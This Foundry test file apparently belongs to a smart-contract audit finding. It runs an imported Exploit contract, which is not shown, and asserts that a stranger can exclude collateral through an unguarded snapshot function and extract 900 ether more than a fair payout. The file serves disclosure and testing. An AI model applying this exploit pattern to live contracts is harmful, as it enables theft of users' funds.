// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Exploit} from "./53840-h-01-updatesystemsnapshots-excludecollremainder-lacks-access.sol";

contract Finding53840Test is Test {
    function test_stranger_excludes_collateral_and_extracts() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.snapshotColl(), 1 ether, "snapshot collapsed to 1");
        assertEq(e.attackerStake(), 1000 ether, "stake inflated to 1000");
        assertEq(e.paid(), 1000 ether, "received 1000");
        assertEq(e.fair(), 100 ether, "fair is 100");
        assertEq(e.paid() - e.fair(), 900 ether, "extra 900");
        assertTrue(e.strangerBlocked(), "gated call reverted");
        emit log_named_uint("paid", e.paid());
        emit log_named_uint("fair", e.fair());
        emit log_named_uint("extra", e.paid() - e.fair());
    }
}
